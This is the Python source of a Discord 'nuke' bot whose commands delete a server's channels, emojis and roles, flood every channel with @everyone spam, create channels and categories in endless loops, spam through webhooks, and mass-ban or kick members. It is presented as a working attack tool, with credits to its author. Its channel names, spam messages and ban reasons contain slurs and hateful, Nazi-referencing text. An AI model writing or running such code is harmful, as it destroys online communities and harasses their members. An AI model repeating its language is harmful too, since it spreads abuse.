#pc version
#CREDITS FOR ད𝔙𝔉ཌFear.#5468







import os
import discord
from discord.ext import commands
import random
from discord import Webhook, AsyncWebhookAdapter
from discord import Permissions
import asyncio
from colorama import Fore, Back, Style

#CREDITS FOR ད𝔙𝔉ཌFear.#5468
CHANNEL_NAMES =  ["RETARD отвергнуть нацистов", "LMAO", "ХЕЙЛ В.Ф."]
SAG_CA= ["SAG ON TOP#RFL"]
SPAM_MESSAGE = ["@everyone NUKED BY CENTRAL SAG FORCES https://discord.gg/Tk2mMH9qRg", "@everyone FUCK AOS" '@everyone REJECT NAZIS https://cdn.discordapp.com/attachments/946447501207150602/971461436817682512/IMG_2510.png' "@everyone SAG https://cdn.discordapp.com/attachments/946447501207150602/971461316751556618/IMG_0344.png"]
WEBHOOK_NAMES = ['WE OWN U','ICY','VICTOR', 'FEAR', 'HOMOPHOBIC','SAG','HAIL VF','HEIL VF']
#CREDITS FOR ད𝔙𝔉ཌFear.#5468
token = ""
intents = discord.Intents.all()
client = discord.Client()
client = commands.Bot(command_prefix=".", intents=intents)

#CREDITS FOR ད𝔙𝔉ཌFear.#5468

@client.event
async def on_ready():
  print("""                                       ▓▓                                       
                                       ▓▓▓                                      
                                       ▓▓▓                                      
                                    ▓▓▓▓▓▓▓▓▓                                   
                                   ▓▓▓▓▓▓▓▓▓▓▓                                  
                 ▓▓▓▓▓     ▓▓      ▓▓▓▓▓▓▓▓▓▓▓      ▓▓    ▓▓▓▓▓▓                
             ▓▓▓▓   ▓▓▓    ▓▓       ▓▓▓▓▓▓▓▓▓       ▓▓    ▓▓▓   ▓▓▓▓            
     ▓▓▓     ▓▓▓▓   ▓▓  ▓▓▓▓▓▓▓▓     ▓▓▓▓▓▓▓     ▓▓▓▓▓▓▓▓  ▓▓   ▓▓▓▓     ▓▓     
     ▓▓▓▓     ▓▓▓  ▓▓   ▓▓▓▓▓▓▓▓   ▓▓▓     ▓▓▓   ▓▓▓▓▓▓▓▓  ▓▓  ▓▓▓▓     ▓▓▓▓    
     ▓▓▓▓▓  ▓▓▓ ▓▓    ▓▓ ▓▓▓▓▓▓▓▓▓             ▓▓ ▓▓▓▓▓▓ ▓▓    ▓▓ ▓▓▓  ▓▓▓▓▓    
   ▓  ▓▓▓▓▓    ▓       ▓▓▓▓▓▓▓▓▓▓▓            ▓▓▓▓▓▓▓▓▓▓▓▓      ▓▓    ▓▓▓▓▓  ▓  
   ▓▓▓ ▓▓▓▓▓        ▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓           ▓▓▓▓▓▓▓▓▓▓▓▓▓▓        ▓▓▓▓▓▓ ▓▓▓  
   ▓▓▓▓▓ ▓▓▓▓▓▓      ▓    ▓▓▓▓▓▓▓▓▓▓▓       ▓▓▓▓▓▓▓▓▓▓▓   ▓▓      ▓▓▓▓▓▓ ▓▓▓▓▓  
    ▓▓▓▓▓▓▓▓▓▓▓▓   ▓▓▓▓▓ ▓▓ ▓▓▓▓▓▓▓▓▓▓     ▓▓▓▓▓▓▓▓▓▓ ▓▓ ▓▓▓▓▓   ▓▓▓▓▓▓▓▓▓▓▓    
  ▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓     ▓       ▓▓▓▓▓▓▓   ▓▓▓▓▓▓▓       ▓     ▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓ 
   ▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓            ▓▓▓▓▓▓▓ ▓▓▓▓▓▓▓            ▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓  
 ▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓          ▓▓▓▓▓▓▓ ▓▓▓▓▓▓▓          ▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓
  ▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓        ▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓        ▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓ 
  ▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓     ▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓     ▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓ 
 ▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓   ▓▓ ▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓ ▓▓   ▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓
     ▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓     ▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓     ▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓    
  ▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓   ▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓   ▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓ 
     ▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓    
   ▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓   
  ▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓      
   ▓▓▓▓▓▓▓▓▓▓▓▓ ▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓ ▓▓▓▓▓▓▓▓▓     
      ▓▓ ▓▓▓▓▓▓▓▓▓ ▓▓▓▓▓▓▓▓ ▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓  ▓▓▓▓▓▓▓▓ ▓▓▓▓▓▓▓▓▓        
        ▓▓▓▓ ▓▓▓▓ ▓▓▓ ▓▓▓▓   ▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓   ▓▓▓▓▓▓▓▓ ▓▓▓▓ ▓▓▓        
        ▓▓   ▓▓▓ ▓▓▓▓ ▓▓▓    ▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓   ▓▓▓▓ ▓▓▓▓ ▓▓▓            
         ▓        ▓          ▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓          ▓                 
          ▓              ▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓                        
           ▓           ▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓        ▓▓▓           
            ▓         ▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓       ▓▓▓▓          
            ▓▓        ▓▓▓▓▓▓▓▓▓     ▓▓▓▓▓▓▓▓▓     ▓▓▓▓▓▓▓▓     ▓▓▓▓▓▓▓▓▓        
             ▓▓▓      ▓ ▓▓▓▓▓▓▓▓ ▓   ▓▓▓▓▓▓▓   ▓ ▓▓▓▓▓▓▓  ▓    ▓▓▓▓▓▓▓▓▓▓       
              ▓▓▓▓▓        ▓▓▓▓    ▓▓▓▓▓▓▓▓▓▓▓    ▓▓▓▓        ▓▓▓▓▓▓▓▓▓▓▓       
              ▓▓▓▓▓▓▓ ▓▓▓▓▓▓▓▓▓▓   ▓▓▓▓ ▓ ▓▓▓▓    ▓▓▓▓▓▓▓▓     ▓▓▓▓▓▓▓▓▓        
             ▓▓▓▓▓▓▓▓▓▓    ▓   ▓▓▓▓ ▓▓▓▓▓ ▓▓▓▓▓▓▓▓   ▓      ▓▓▓▓▓▓▓▓▓▓          
               ▓▓▓▓▓     ▓▓▓▓▓▓▓▓  ▓▓▓ ▓▓▓ ▓▓▓  ▓▓▓▓▓▓▓         ▓               
                 ▓▓▓      ▓▓▓▓▓▓▓ ▓▓▓ ▓▓▓▓  ▓▓▓ ▓▓▓▓▓▓▓                         
                   ▓     ▓▓▓▓▓▓ ▓▓▓▓▓ ▓▓▓▓▓ ▓▓▓▓▓ ▓▓▓▓▓▓                        
                         ▓▓ ▓▓▓▓▓▓▓▓▓ ▓▓▓▓▓ ▓▓▓▓▓▓▓▓▓ ▓▓                        
                             ▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓      ▓▓▓▓  ▓                       .banall(working)
                   .nuke(working)
                   .kickall(working)
                   .spamca(working) """)      

  prefix = "."
#CREDITS FOR ད𝔙𝔉ཌFear.#5468

@client.command()
async def nuke(ctx, amount = 200):
  await ctx.message.delete()
  await ctx.guild.edit(name="HAIL SAG")
  guild = ctx.guild
  for channel in guild.channels:
      try:
        await channel.delete()
      except:
        pass
  for emoji in list(ctx.guild.emojis):
     try:
       await emoji.delete()
     except:
       pass
  for i in range(amount):
    try:  
      await ctx.guild.create_text_channel(random.choice(CHANNEL_NAMES))
    except:
      pass
  for role in ctx.guild.roles:
    try:
      await role.delet()
    except:
      pass
  for i in range(1000):  
    for i in range(10000):
      for channel in ctx.guild.channels:
        try:
          await channel.send(random.choice(SPAM_MESSAGE))
        except:
          pass
  for member in ctx.guild.members:
      if member.id != 320408390587121664:  #dont edit this
        try:
          await member.ban(reason="monkey fag")
        except:
          pass
#CREDITS FOR ད𝔙𝔉ཌFear.#5468
@client.command()
async def kickall(ctx):
  await ctx.message.delete()
  for member in ctx.guild.members:
    try:
      await member.kick(reason="NUKED BY SAG")
      print("kicked all.")
    except:
      pass
#CREDITS FOR ད𝔙𝔉ཌFear.#5468
@client.command()
@commands.is_owner()
async def online(ctx):
    await client.change_presence(status=discord.Status.online) #CREDITS FOR ད𝔙𝔉ཌFear.#5468
    await ctx.message.delete()
print("bot is online")
#CREDITS FOR ད𝔙𝔉ཌFear.#5468
@client.command()
@commands.is_owner()
async def offline(ctx):
    await client.change_presence(status=discord.Status.offline) #CREDITS FOR ད𝔙𝔉ཌFear.#5468
    await ctx.message.delete()
#CREDITS FOR ད𝔙𝔉ཌFear.#5468
@client.command()
async def spamca(ctx):
  await ctx.message.delete()
  while True:
    await ctx.guild.create_category(name=f"{SAG_CA}")
    await ctx.guild.create_category(name=f"{SAG_CA}")
    await ctx.guild.create_category(name=f"{SAG_CA}")
    await ctx.guild.create_category(name=f"{SAG_CA}")
    await ctx.guild.create_category(name=f"{SAG_CA}")
    await ctx.guild.create_category(name=f"{SAG_CA}")
    await ctx.guild.create_category(name=f"{SAG_CA}")
    await ctx.guild.create_category(name=f"{SAG_CA}")
#CREDITS FOR ད𝔙𝔉ཌFear.#5468
@client.command()
async def banall(ctx):
 await ctx.message.delete()
 for user in ctx.guild.members:
        try:
            await user.ban()
        except:
           pass
#CREDITS FOR ད𝔙𝔉ཌFear.#5468
#CREDITS FOR ད𝔙𝔉ཌFear.#5468
@client.event
async def on_guild_channel_create(channel):
  webhook =await channel.create_webhook(name = random.choice(WEBHOOK_NAMES))  
  while True:  
    await channel.send(random.choice(SPAM_MESSAGE))
    await webhook.send(random.choice(SPAM_MESSAGE), username=random.choice(WEBHOOK_NAMES))
token = (token)
client.run(token) #dont edit
#CREDITS FOR ད𝔙𝔉ཌFear.#5468
#CREDITS FOR ད𝔙𝔉ཌFear.#5468
#CREDITS FOR ད𝔙𝔉ཌFear.#5468
